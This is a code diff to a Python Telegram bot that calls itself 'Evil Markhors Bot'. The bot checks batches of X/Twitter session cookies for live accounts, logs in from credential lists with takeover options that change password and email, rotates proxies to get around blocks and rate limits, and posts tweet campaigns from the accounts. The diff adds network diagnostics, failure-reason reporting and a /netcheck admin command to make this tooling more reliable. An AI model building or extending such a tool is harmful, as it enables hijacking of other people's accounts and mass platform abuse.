@@ -78,9 +78,14 @@ CAMP_STAGE_SEC = int(os.getenv("CAMP_STAGE_SEC", str(6 * 3600)))
 PROXIES_RAW = os.getenv("PROXIES", "")
 PROXY_FILE = os.getenv("PROXY_FILE", "").strip()
 PROXY_MODE = os.getenv("PROXY_MODE", "rotate").strip().lower()
-PROXY_TEST_URL = os.getenv("PROXY_TEST_URL", "https://api.x.com/1.1/help.json")
+PROXY_TEST_URL = os.getenv(
+    "PROXY_TEST_URL",
+    "https://api.x.com/1.1/account/verify_credentials.json")
 PROXY_HOSTS = ("api.x.com", "upload.x.com", "api.twitter.com",
                "upload.twitter.com", "x.com", "twitter.com")
+# Deploy ke baad admins ko ek netcheck summary bhejein (0 = off).
+NETCHECK_ON_START = os.getenv("NETCHECK_ON_START", "1").strip().lower() in (
+    "1", "true", "yes", "on")
 HTTPONLY_NAMES = {"auth_token", "ct0", "kdt", "twid", "guest_id",
                   "guest_id_marketing", "guest_id_ads"}
 
@@ -252,7 +257,8 @@ FILES = {
                      "REVERIFY_CONC=4\nDEAD_AFTER=2\n"
                      "# proxies (X traffic only). HTTP/SOCKS5 endpoints, not vless://\n"
                      "PROXIES=\nPROXY_FILE=\nPROXY_MODE=rotate\n"
-                     "PROXY_TEST_URL=https://api.x.com/1.1/help.json\n"),
+                     "PROXY_TEST_URL=https://api.x.com/1.1/account/verify_credentials.json\n"
+                     "NETCHECK_ON_START=1\n"),
     "Dockerfile": ("FROM python:3.12-slim\nWORKDIR /app\n"
                    "ENV PYTHONUNBUFFERED=1 STORE_PATH=/app/users.json\n"
                    "COPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\n"
@@ -654,6 +660,33 @@ class Progress:
         self.last = 0.0
         self.lock = asyncio.Lock()
         self.phase = "start"
+        # reason -> count, sirf diagnostics ke liye (caption/report mein dikhta hai)
+        self.notes = {}
+
+    def add_note(self, reason):
+        """Failure reason ka short counter, taake 'sab unknown' ka cause dikhe."""
+        r = " ".join(str(reason or "unknown").split()).lower()[:60] or "unknown"
+        self.notes[r] = self.notes.get(r, 0) + 1
+
+    def notes_text(self, top=3):
+        if not self.notes:
+            return ""
+        items = sorted(self.notes.items(), key=lambda kv: -kv[1])[:top]
+        return " | ".join(k + " x" + str(v) for k, v in items)
+
+    def all_unknown_hint(self):
+        """Jab ek bhi live na mile aur sab unknown hon."""
+        if self.unk <= 0 or self.live > 0:
+            return ""
+        notes = self.notes_text(6)
+        if "live check off" in notes.lower():
+            return "\nLive check OFF hai - /live on karke dobara bhejo."
+        hint = ("\nSab unknown - X tak request nahi pohanchi (cookies DEAD nahi hain)."
+                "\n/proxy test, /netcheck aur /diag chalao.")
+        if notes and ("net" in notes or "proxy" in notes or "timeout" in notes
+                      or "403" in notes or "429" in notes):
+            hint += "\nWajah lagti hai: network/proxy."
+        return hint
 
     async def update(self, phase=None, force=False):
         if phase:
@@ -673,7 +706,8 @@ class Progress:
                         + " | fail " + str(self.fail)
                         + (" | unknown " + str(self.unk) if self.unk else "")
                         + " | code " + str(self.pend) + "\nwaqt " + _fmt_t(el)
-                        + " | baaqi ~" + _fmt_t(eta))
+                        + " | baaqi ~" + _fmt_t(eta)
+                        + ("\n" + self.notes_text(2) if self.notes else ""))
 
 
 # ============================ COOKIE MODE ============================
@@ -794,15 +828,41 @@ def hdrs(ck):
             "x-twitter-client-language": "en", "User-Agent": UA, "Accept": "application/json"}
 
 
-async def get_json(client, ck, url):
-    """Return (state, payload). state: ok | auth | retry | bad | net."""
+NET_LAST = {"at": 0.0, "what": ""}
+
+
+def net_note(what):
+    """Aakhri network/API error, /diag ke liye. Racy hai lekin sirf text hai."""
+    NET_LAST["at"] = time.time()
+    NET_LAST["what"] = " ".join(str(what or "").split())[:90]
+
+
+def net_last_text():
+    if not NET_LAST["at"]:
+        return "abhi tak koi net error nahi"
+    ago = max(int(time.time() - NET_LAST["at"]), 0)
+    return NET_LAST["what"] + " (" + str(ago) + "s pehle)"
+
+
+async def get_json(client, ck, url, why=None):
+    """Return (state, payload). state: ok | auth | retry | bad | net.
+
+    `why` optional dict hai: fail hone par why["v"] mein short reason aata hai,
+    taake verify caption mein "unknown" ka asli cause dikhe.
+    """
+    def note(s):
+        if why is not None:
+            why["v"] = s
+        net_note(s)
+
     delay = 1.0
     for attempt in range(RETRIES + 1):
         try:
             r = await client.get(url, headers=hdrs(ck), cookies=ck, timeout=TIMEOUT)
         except asyncio.CancelledError:
             raise
-        except Exception:
+        except Exception as e:
+            note("net " + type(e).__name__)
             if attempt >= RETRIES:
                 return "net", None
             await asyncio.sleep(delay)
@@ -812,6 +872,7 @@ async def get_json(client, ck, url):
             try:
                 return "ok", r.json()
             except Exception:
+                note("bad json body")
                 return "bad", None
         if r.status_code in (401, 403):
             try:
@@ -823,18 +884,30 @@ async def get_json(client, ck, url):
             # JSON nahi hoti. Sirf known dead/locked/suspended code ko auth
             # maano, warna live account DEAD ho kar purge ho jata hai.
             if codes & (DEAD_CODES | LOCKED_CODES | SUSP_CODES):
+                note(err_reason(codes) or ("x " + str(r.status_code)))
                 return "auth", b
+            note("x " + str(r.status_code)
+                 + (" block/limit" if r.status_code == 403 else " auth-ish"))
             if attempt >= RETRIES:
                 return "retry", b
             await asyncio.sleep(delay)
             delay *= 2
             continue
-        if r.status_code == 429 or r.status_code >= 500:
+        if r.status_code == 429:
+            note("x 429 rate limit")
             if attempt >= RETRIES:
                 return "retry", None
             await asyncio.sleep(delay)
             delay *= 2
             continue
+        if r.status_code >= 500:
+            note("x " + str(r.status_code) + " server")
+            if attempt >= RETRIES:
+                return "retry", None
+            await asyncio.sleep(delay)
+            delay *= 2
+            continue
+        note("x " + str(r.status_code) + " unexpected")
         return "bad", None
     return "retry", None
 
@@ -906,9 +979,11 @@ async def detect_country(client, ck):
 
 async def live_check(client, ck):
     d = {}
-    st, j = await get_json(client, ck, VERIFY_URL + "&include_email=true")
+    why = {}
+    st, j = await get_json(client, ck, VERIFY_URL + "&include_email=true", why)
     if st == "auth":
-        st, j = await get_json(client, ck, VERIFY_URL)
+        why = {}
+        st, j = await get_json(client, ck, VERIFY_URL, why)
     if (st == "ok" and isinstance(j, dict) and not j.get("errors")
             and (j.get("screen_name") or j.get("id_str"))):
         d["Status"] = "LIVE"
@@ -937,13 +1012,70 @@ async def live_check(client, ck):
             d["Reason"] = err_reason(codes)
         else:
             d["Status"] = "UNKNOWN"
-            d["Reason"] = err_reason(codes)
+            d["Reason"] = err_reason(codes) or "empty verify payload"
     elif st == "auth":
         d["Status"] = "DEAD"
-        d["Reason"] = err_reason(err_codes(j)) or "auth 401/403"
+        d["Reason"] = err_reason(err_codes(j)) or why.get("v") or "auth 401/403"
+    elif st == "ok":
+        d["Status"] = "UNKNOWN"
+        d["Reason"] = "bad verify payload"
     else:
         d["Status"] = "UNKNOWN"
+        d["Reason"] = why.get("v") or ("verify " + st)
     return d
+
+
+X_ROUTE = {"at": 0.0, "ok": None, "why": ""}
+
+
+async def x_route_check(ttl=300):
+    """Ek dummy (read-only) verify se check karo ke X tak route chal raha hai.
+
+    Asli cookies use nahi hoti. Agar jawab JSON hai to X tak pohanch rahe hain
+    (401/403 bhi theek - matlab auth fail hua, network nahi). HTML/Cloudflare
+    ya connection error ka matlab route band hai.
+    """
+    now = time.time()
+    if X_ROUTE["ok"] is not None:
+        age = now - X_ROUTE["at"]
+        if X_ROUTE["ok"] and age < ttl:
+            return True, ""
+        if not X_ROUTE["ok"] and age < 60:
+            return False, X_ROUTE["why"]
+    fake = {"auth_token": "0" * 40, "ct0": "0" * 32}
+    ok, why = False, ""
+    try:
+        async with http_client() as cl:
+            r = await cl.get(VERIFY_URL, headers=hdrs(fake), cookies=fake,
+                             timeout=min(TIMEOUT, 20.0))
+        try:
+            body = r.json()
+        except Exception:
+            body = None
+        if isinstance(body, dict):
+            ok = True
+        else:
+            low = (r.text or "")[:300].lower()
+            why = "x " + str(r.status_code)
+            if "cloudflare" in low or "<html" in low or "captcha" in low:
+                why += " block page"
+            else:
+                why += " non-json"
+    except asyncio.CancelledError:
+        raise
+    except Exception as e:
+        why = "net " + type(e).__name__
+    X_ROUTE.update({"at": now, "ok": ok, "why": why})
+    if not ok:
+        net_note("route " + why)
+        logging.warning("x route check fail: %s", why)
+    return ok, why
+
+
+def route_fail_text(why):
+    return ("X tak request nahi pohanch rahi: " + (why or "unknown") + "\n"
+            "Isliye koi account verify nahi hua - ye suspension nahi hai.\n"
+            "/netcheck chalao. Proxy galat hai to /proxy off se direct try karo.")
 
 
 def db_row_from(data, ck, uid):
@@ -1789,6 +1921,7 @@ class CampProgress(Progress):
                         + " | skip " + str(self.skip) + "\nPK " + str(self.role["PK"])
                         + " | IN " + str(self.role["IN"]) + " | OTHER "
                         + str(self.role["OTHER"]) + "\nfail: " + top
+                        + ("\n" + self.notes_text(2) if self.notes else "")
                         + "\nwaqt " + _fmt_t(el) + " | baaqi ~" + _fmt_t(eta))
 
     async def push_feed(self, line):
@@ -1808,8 +1941,9 @@ async def _tweet_req(client, ck, data):
                 cookies=ck, data=data, timeout=TIMEOUT)
         except asyncio.CancelledError:
             raise
-        except (httpx.ConnectError, httpx.ConnectTimeout, httpx.ProxyError):
+        except (httpx.ConnectError, httpx.ConnectTimeout, httpx.ProxyError) as e:
             # Request X tak nahi pahunchi - safe retry.
+            net_note("tweet net " + type(e).__name__)
             if attempt >= RETRIES:
                 return None, "NET"
             await asyncio.sleep(delay)
@@ -1819,6 +1953,7 @@ async def _tweet_req(client, ck, data):
             # Read/write timeout ya connection drop: X ne request le li ho
             # sakti hai. Retry karne se double post ho jata hai.
             logging.warning("tweet send unknown: %s", e)
+            net_note("tweet drop " + type(e).__name__)
             return None, "UNKNOWN"
         if r.status_code == 200:
             try:
@@ -1828,8 +1963,10 @@ async def _tweet_req(client, ck, data):
             if isinstance(j, dict) and j.get("id_str"):
                 return j, None
             logging.warning("tweet 200 without id_str: %s", (r.text or "")[:200])
+            net_note("tweet 200 no id_str")
             return None, "UNKNOWN"
         if r.status_code == 429:
+            net_note("tweet 429 rate limit")
             reset = r.headers.get("x-rate-limit-reset")
             wait = delay
             try:
@@ -1948,7 +2085,9 @@ async def campaign_loop(u, cfg, accounts, prog, state, client, uid):
                     cookie_lines(ck))
             det = await asyncio.wait_for(live_check(client, ck), ACC_TIMEOUT)
             if det.get("Status") == "UNKNOWN":
-                state["failed"].append(dict(rec, cls="NET", why="verify unknown"))
+                why = det.get("Reason") or "verify unknown"
+                state["failed"].append(dict(rec, cls="NET", why=why))
+                prog.add_note("unknown: " + why)
                 state["retry"].append(rec)
                 prog.fail += 1
                 prog.cls["NET"] = prog.cls.get("NET", 0) + 1
@@ -2162,6 +2301,11 @@ async def run_campaign_db(u, uid):
 
 
 async def _campaign_run(u, cfg, accounts, state, uid):
+    if accounts:
+        ok, why = await x_route_check()
+        if not ok:
+            await u.message.reply_text(route_fail_text(why))
+            return
     msg = await u.message.reply_text("Campaign shuru...")
     prog = CampProgress(msg, len(accounts), cfg)
     prog.phase = "Verify + post"
@@ -2241,6 +2385,11 @@ async def send_report(u, uid, state, cfg):
                     i += 1
                 used.add(name)
                 z.writestr("retry/" + name, r["raw"])
+    reasons = {}
+    for f in failed:
+        k = f["cls"] + ": " + (f.get("why") or "?")
+        reasons[k] = reasons.get(k, 0) + 1
+    top_reasons = sorted(reasons.items(), key=lambda kv: -kv[1])[:5]
     summary = ("Campaign done\nposted " + str(len(posted))
                + " | failed " + str(len(failed))
                + " | skipped " + str(len(skipped))
@@ -2248,8 +2397,13 @@ async def send_report(u, uid, state, cfg):
                + "\nPK " + str(len([p for p in posted if p["role"] == "PK"]))
                + " | IN " + str(len([p for p in posted if p["role"] == "IN"]))
                + " | OTHER " + str(len([p for p in posted if p["role"] == "OTHER"]))
-               + "\nretry-able: " + str(len(state.get("retry", [])))
-               + "\nbatch: camp" + bid + "\nDelete tweets: /delbatch camp" + bid)
+               + "\nretry-able: " + str(len(state.get("retry", []))))
+    if top_reasons:
+        summary += "\nWajah: " + " | ".join(k + " x" + str(v) for k, v in top_reasons)
+    if not posted and failed and all(f["cls"] == "NET" for f in failed):
+        summary += ("\nSab NET/unknown: X tak request nahi pohanchi (cookies DEAD nahi)."
+                    "\n/proxy test, /netcheck aur /diag chalao.")
+    summary += "\nbatch: camp" + bid + "\nDelete tweets: /delbatch camp" + bid
     LAST_REPORT[str(uid)] = (
         summary
         + ("\n\nFAILED (first 20):\n"
@@ -2375,6 +2529,8 @@ PROXY_UNSUPPORTED = ("vless", "vmess", "trojan", "ss", "shadowsocks",
 PROXIES = []
 PROXY_SKIPPED = []
 PROXY_HINT = set()
+# Runtime switch: /proxy off se proxies band (deploy ke baghair test ke liye).
+PROXY_DISABLED = False
 
 
 def mask_proxy(url):
@@ -2542,7 +2698,7 @@ class RotatingProxy(_AsyncBaseTransport):
 
 def proxy_mounts():
     """X hosts ke liye rotating transport, baaki traffic direct."""
-    if not PROXIES:
+    if not PROXIES or PROXY_DISABLED:
         return None
     tr = RotatingProxy(PROXIES, proxy_mode())
     mounts = {}
@@ -2553,6 +2709,9 @@ def proxy_mounts():
 
 
 def proxy_status_text():
+    if PROXY_DISABLED and PROXIES:
+        return ("Proxy: OFF (/proxy off) | " + str(len(PROXIES))
+                + " configured\n/proxy on se wapas ON")
     if not PROXIES:
         txt = "Proxy: OFF (PROXIES khaali)"
         if PROXY_SKIPPED:
@@ -2596,7 +2755,9 @@ async def probe_proxy(proxy):
         return {"proxy": proxy, "ok": False, "why": type(e).__name__,
                 "ms": int((time.time() - t0) * 1000)}
     ms = int((time.time() - t0) * 1000)
-    ok = r.status_code < 500
+    # 407 = proxy auth chahiye, ye usable nahi. 401/403 X ka jawab ho sakta
+    # hai (proxy ka masla nahi), isliye unhe reachable maana jata hai.
+    ok = r.status_code < 500 and r.status_code != 407
     return {"proxy": proxy, "ok": ok, "code": r.status_code, "ms": ms}
 
 
@@ -2703,6 +2864,9 @@ async def process_cookie_zip(ip, op, live, prog, sink=None, uid="0"):
                         sink.append(row)
             elif data.get("Status") == "UNKNOWN":
                 prog.unk += 1
+                prog.add_note("unknown: " + str(data.get("Reason") or "?"))
+            elif data.get("Status") == "DEAD":
+                prog.add_note("dead: " + str(data.get("Reason") or "?"))
             prog.ok += 1
     prog.done = prog.total
     await prog.update(force=True)
@@ -2759,9 +2923,11 @@ async def process_verify(ip, op, live, prog, sink=None, uid="0"):
         elif st == "UNKNOWN":
             unknown.append((name, body))
             prog.unk += 1
+            prog.add_note("unknown: " + str(data.get("Reason") or "?"))
         else:
             dead.append((name, body))
             prog.fail += 1
+            prog.add_note("dead: " + str(data.get("Reason") or "?"))
     with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
         used = set()
         for name, out in working:
@@ -2804,7 +2970,8 @@ async def process_verify_single(ip, op, live, prog, sink=None, uid="0"):
         z.writestr(folder + "/account.txt", body)
         z.writestr("summary.txt", "working: " + ("1" if st == "LIVE" else "0")
                    + "\ndead: " + ("1" if st == "DEAD" else "0")
-                   + "\nunknown: " + ("1" if st == "UNKNOWN" else "0"))
+                   + "\nunknown: " + ("1" if st == "UNKNOWN" else "0")
+                   + "\nreason: " + str(data.get("Reason") or "-"))
     if st == "LIVE":
         prog.ok += 1
         prog.live += 1
@@ -2814,8 +2981,10 @@ async def process_verify_single(ip, op, live, prog, sink=None, uid="0"):
                 sink.append(row)
     elif st == "UNKNOWN":
         prog.unk += 1
+        prog.add_note("unknown: " + str(data.get("Reason") or "?"))
     else:
         prog.fail += 1
+        prog.add_note("dead: " + str(data.get("Reason") or "?"))
     prog.done = 1
     await prog.update(force=True)
 
@@ -3097,7 +3266,8 @@ CMD_PAGES = [
   "/help\nChhota format guide.\n\n"
   "/commands [page]\nYehi list, page number se: /commands 6. Buttons bhi hain.\n\n"
   "/status\nAapki settings: mode, live, takeover, newpass, newemail, store, batch, pending, split, campaign.\n\n"
-  "/diag\nSystem info: python, lib version, DB on/off, table, reverify hours, admin. Support se pehle yehi bhejo.")),
+  "/diag\nSystem info: python, lib version, DB on/off, table, reverify hours, live, store, last net error, admin. Support se pehle yehi bhejo.\n\n"
+  "/netcheck\nAdmin. X direct + har proxy + Supabase ka reachability test, saath verdict.")),
  ("2. Settings", (
   "/mode auto|cookies|ulp|verify\nFile mode force. auto = content se detect.\n\n"
   "/live on|off\nCookie rework pe live check. OFF = koi API call nahi, sirf parse.\n\n"
@@ -3151,8 +3321,9 @@ CMD_PAGES = [
   "/delbatches\nSaved batches.\n/delbatch <id>\nTweets delete.\n/broadcast <text>\nSab users ko.\n"
   "/countrytest\nEk cookie .txt — country + username batata hai.\n\n"
   "/proxy\nProxy status (masked).\n/proxy test\nHar proxy check (ok/fail + ms).\n"
-  "/proxy list\nMasked list.\n/proxy reload\nPROXY_FILE dobara padho.\n\n"
-  "Admin: /split /splitoff /extract /camp /stopcamp /db /delbatches /delbatch /broadcast /countrytest /proxy")),
+  "/proxy list\nMasked list.\n/proxy reload\nPROXY_FILE dobara padho.\n/proxy off|on\nIs run ke liye proxy band/chalu (deploy ke baghair test).\n\n"
+  "/netcheck\nX direct + proxies + Supabase, ek hi jagah.\n\n"
+  "Admin: /split /splitoff /extract /camp /stopcamp /db /delbatches /delbatch /broadcast /countrytest /proxy /netcheck")),
  ("11. Errors", (
   "Jawab nahi de raha > /diag + Railway logs.\n"
   "DB off > SUPABASE_URL/KEY check, redeploy.\n"
@@ -3211,7 +3382,7 @@ async def on_cmd_cb(u, c):
 async def start(u, c):
     await u.message.reply_text(
         "Evil Markhors Bot\n\nModes:\n1) COOKIES rework\n2) ULP login + takeover\n3) VERIFY\n\n"
-        "/mode /live /takeover /newpass /newemail /store /status /diag /finalize /cancel\n"
+        "/mode /live /takeover /newpass /newemail /store /status /diag /netcheck /finalize /cancel\n"
         "Admin: /camp /db /split /extract /broadcast /countrytest /delbatches\n\n"
         "Poori command list: /commands")
 
@@ -3259,22 +3430,41 @@ async def status_cmd(u, c):
 async def diag_cmd(u, c):
     import platform
     import telegram
+    uid = str(u.effective_user.id)
     px = (str(len(PROXIES)) + " | " + proxy_mode()) if PROXIES else "OFF"
     await u.message.reply_text(
         "py " + platform.python_version() + " | ptb " + telegram.__version__ + "\n"
         "db " + ("ON" if db_enabled() else "OFF") + " | table " + DB_TABLE + "\n"
         "reverify " + str(REVERIFY_HOURS) + "h | batch " + str(REVERIFY_BATCH)
         + " | dead_after " + str(DEAD_AFTER) + "\n"
-        "proxy " + px + "\nadmin " + str(is_admin(u.effective_user.id)))
+        "live " + ("ON" if ucfg(uid)["live"] else "OFF")
+        + " | store " + get_store_mode(uid) + "\n"
+        "proxy " + px + "\n"
+        "last net: " + net_last_text() + "\n"
+        + ("proxy hint: " + PROXY_HINT + "\n" if PROXY_HINT else "")
+        + "admin " + str(is_admin(u.effective_user.id)))
 
 
 async def proxy_cmd(u, c):
+    global PROXY_DISABLED
     if not is_admin(u.effective_user.id):
         await u.message.reply_text("Sirf admin.")
         return
     a = c.args[0].lower() if c.args else ""
+    if a in ("off", "on"):
+        PROXY_DISABLED = (a == "off")
+        X_ROUTE.update({"at": 0, "ok": None, "why": ""})
+        if a == "off":
+            await u.message.reply_text(
+                "Proxy OFF (is run ke liye). X traffic direct jayega.\n"
+                "/netcheck se direct test karo, wapas ON: /proxy on")
+        else:
+            load_proxies()
+            await u.message.reply_text("Proxy ON\n" + proxy_status_text())
+        return
     if a == "reload":
         n = len(load_proxies())
+        X_ROUTE.update({"at": 0, "ok": None, "why": ""})
         await u.message.reply_text("Proxy reload: " + str(n) + " configured\n"
                                    + proxy_status_text())
         return
@@ -3304,7 +3494,101 @@ async def proxy_cmd(u, c):
     await u.message.reply_text(
         proxy_status_text()
         + "\n\n/proxy test - har proxy check\n/proxy list - masked list"
-          "\n/proxy reload - PROXY_FILE dobara padho")
+          "\n/proxy reload - PROXY_FILE dobara padho"
+          "\n/proxy off|on - is run ke liye proxy band/chalu")
+
+
+async def netcheck_one(label, url, headers=None, proxy=None):
+    t0 = time.time()
+    kw = {"timeout": httpx.Timeout(15.0), "follow_redirects": False,
+          "trust_env": False}
+    if proxy:
+        kw["proxy"] = proxy
+    try:
+        async with httpx.AsyncClient(**kw) as cl:
+            r = await cl.get(url, headers=headers or {"User-Agent": UA})
+    except Exception as e:
+        return label + ": FAIL " + type(e).__name__, False, 0
+    ms = int((time.time() - t0) * 1000)
+    return (label + ": HTTP " + str(r.status_code) + " " + str(ms) + "ms",
+            True, r.status_code)
+
+
+async def netcheck_report(proxy_limit=10):
+    lines = []
+    x_url = PROXY_TEST_URL
+    line, direct_ok, _ = await netcheck_one("X direct", x_url)
+    lines.append(line)
+    proxy_ok = 0
+    proxy_fail = 0
+    use_proxy = bool(PROXIES) and not PROXY_DISABLED
+    if use_proxy:
+        res = await pmap(probe_proxy, PROXIES[:proxy_limit], 4)
+        for r in res:
+            if not r:
+                proxy_fail += 1
+                lines.append("proxy ?: FAIL")
+                continue
+            if r["ok"]:
+                proxy_ok += 1
+            else:
+                proxy_fail += 1
+            lines.append("proxy " + mask_proxy(r["proxy"]) + ": "
+                         + ("HTTP " + str(r.get("code")) if r.get("ok")
+                            else "FAIL " + str(r.get("why") or "?"))
+                         + " " + str(r.get("ms", 0)) + "ms")
+    else:
+        lines.append("proxy: OFF (direct hi use ho raha hai)"
+                     if not PROXIES else "proxy: OFF (/proxy off)")
+    if db_enabled():
+        sline, _, db_code = await netcheck_one(
+            "Supabase", db_url() + "?select=username&limit=1", db_headers())
+        lines.append(sline)
+        db_ok = 0 < db_code < 400
+    else:
+        db_ok = False
+        lines.append("Supabase: OFF")
+    if use_proxy and proxy_ok and proxy_fail:
+        verdict = "Kuch proxies fail hain - sirf working wale rakho."
+    elif use_proxy and not proxy_ok:
+        verdict = ("Sab proxies X tak nahi pohanch rahe. Path-auth/vless link "
+                   "httpx proxy nahi hai; http://user:pass@host:port ya socks5 chahiye.")
+    elif use_proxy and proxy_ok and not direct_ok:
+        verdict = "Proxy theek hai, direct block hai - proxy ON rakho."
+    elif not use_proxy and direct_ok:
+        verdict = "Direct X reachable. Agar verify phir bhi unknown ho to cookies/403 dekho."
+    elif not use_proxy and not direct_ok:
+        verdict = "Railway se X tak network/DNS fail. Proxy lagao."
+    else:
+        verdict = "X reachable."
+    if not db_ok and db_enabled():
+        verdict += "\nSupabase fail - URL/key/table check karo."
+    return ("NETCHECK\n" + "\n".join(lines)
+            + "\n\n" + verdict + "\n\nLast error: " + net_last_text())
+
+
+async def netcheck_cmd(u, c):
+    if not is_admin(u.effective_user.id):
+        await u.message.reply_text("Sirf admin.")
+        return
+    msg = await u.message.reply_text("Netcheck...")
+    await _edit(msg, await netcheck_report(10))
+
+
+async def startup_netcheck(app):
+    """Deploy ke baad ek dafa X/proxy/Supabase reachability check."""
+    await asyncio.sleep(20)
+    try:
+        txt = await netcheck_report(3)
+    except Exception:
+        logging.exception("startup_netcheck")
+        return
+    logging.warning("startup %s", txt.replace("\n", " | "))
+    for aid in ADMIN_IDS:
+        try:
+            await app.bot.send_message(aid, txt)
+        except Exception:
+            logging.warning("netcheck alert fail %s", aid)
 
 
 async def mode_cmd(u, c):
@@ -4137,6 +4421,10 @@ async def verify_with_store(u, uid, st, choice):
     sink = [] if want_db else None
     op = os.path.join(tmp, "out.zip")
     try:
+        ok, why = await x_route_check()
+        if not ok:
+            await _ctx_say(u, route_fail_text(why))
+            return
         prog = Progress(msg, 0, "VERIFY")
         prog.phase = "Checking"
         if st.get("is_zip"):
@@ -4146,6 +4434,9 @@ async def verify_with_store(u, uid, st, choice):
         cap = ("Verify | live " + str(prog.live) + " | dead " + str(prog.fail))
         if prog.unk:
             cap += " | unknown " + str(prog.unk)
+        if prog.notes:
+            cap += "\nWajah: " + prog.notes_text(3)
+        cap += prog.all_unknown_hint()
         if want_db:
             if sink:
                 async with http_client() as client:
@@ -4180,6 +4471,11 @@ async def process_with_store(u, uid, st, choice):
     if not want_db and not want_file:
         want_file = True
     try:
+        if live:
+            ok, why = await x_route_check()
+            if not ok:
+                await _ctx_say(u, route_fail_text(why))
+                return
         prog = Progress(msg, 1, "COOKIES")
         prog.phase = "Rework + verify"
         if is_zip:
@@ -4197,8 +4493,10 @@ async def process_with_store(u, uid, st, choice):
                         sink.append(row)
             elif data.get("Status") == "UNKNOWN":
                 prog.unk = 1
+                prog.add_note("unknown: " + str(data.get("Reason") or "?"))
             else:
                 prog.fail = 1
+                prog.add_note("dead: " + str(data.get("Reason") or "?"))
             with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
                 z.writestr("reworked.txt", out)
             prog.done = 1
@@ -4211,6 +4509,9 @@ async def process_with_store(u, uid, st, choice):
                + " | fail " + str(prog.fail))
         if prog.unk:
             cap += " | unknown " + str(prog.unk)
+        if prog.notes:
+            cap += "\nWajah: " + prog.notes_text(3)
+        cap += prog.all_unknown_hint()
         if want_db:
             cap += "\nDB added: " + str(db_ok) + (" (" + db_err + ")" if db_err else "")
             if not live:
@@ -4286,6 +4587,11 @@ async def handle_file(u, c, doc):
                     await ask_store(msg, st)
                     return
                 op = os.path.join(tmp, "out.zip")
+                ok, why = await x_route_check()
+                if not ok:
+                    await _edit(msg, route_fail_text(why))
+                    await _hard_clear(uid)
+                    return
                 prog = Progress(msg, 0, "VERIFY")
                 prog.phase = "Checking"
                 sink = [] if smode in ("db", "both") and db_enabled() else None
@@ -4296,6 +4602,9 @@ async def handle_file(u, c, doc):
                 cap = "Verify | live " + str(prog.live) + " | dead " + str(prog.fail)
                 if prog.unk:
                     cap += " | unknown " + str(prog.unk)
+                if prog.notes:
+                    cap += "\nWajah: " + prog.notes_text(3)
+                cap += prog.all_unknown_hint()
                 if sink:
                     async with http_client() as client:
                         n, e = await db_upsert(client, sink)
@@ -4544,12 +4853,14 @@ async def post_init(app):
             pass
     app.bot_data["rev"] = asyncio.create_task(reverify_loop(app))
     app.bot_data["jan"] = asyncio.create_task(janitor_loop())
+    if NETCHECK_ON_START:
+        app.bot_data["net"] = asyncio.create_task(startup_netcheck(app))
     logging.info("reverify loop start (%sh)", REVERIFY_HOURS)
 
 
 async def post_shutdown(app):
     tasks = []
-    for key in ("rev", "jan"):
+    for key in ("rev", "jan", "net"):
         t = app.bot_data.get(key)
         if t:
             t.cancel()
@@ -4624,6 +4935,7 @@ def main():
     handlers = [
         ("start", start), ("help", help_cmd), ("commands", commands_cmd),
         ("status", status_cmd), ("diag", diag_cmd), ("proxy", proxy_cmd),
+        ("netcheck", netcheck_cmd),
         ("store", store_cmd),
         ("mode", mode_cmd), ("verify", verify_cmd), ("live", live_cmd),
         ("takeover", takeover_cmd), ("newpass", newpass_cmd), ("newemail", newemail_cmd),
@@ -4646,8 +4958,12 @@ def main():
         on_doc))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
     app.add_error_handler(on_error)
-    logging.info("Bot chalu | db=%s | proxy=%s", db_enabled(),
-                 (str(len(PROXIES)) if PROXIES else "off"))
+    logging.info("Bot chalu | db=%s | proxy=%s | live=%s | state=%s",
+                 db_enabled(), (str(len(PROXIES)) if PROXIES else "off"),
+                 ("on" if LIVE_DEFAULT else "OFF"), STATE_DIR)
+    if not LIVE_DEFAULT:
+        logging.warning("LIVE=0: cookie/verify rework koi X API call nahi karega, "
+                        "sab UNKNOWN aayega")
     app.run_polling(drop_pending_updates=True)
 
 
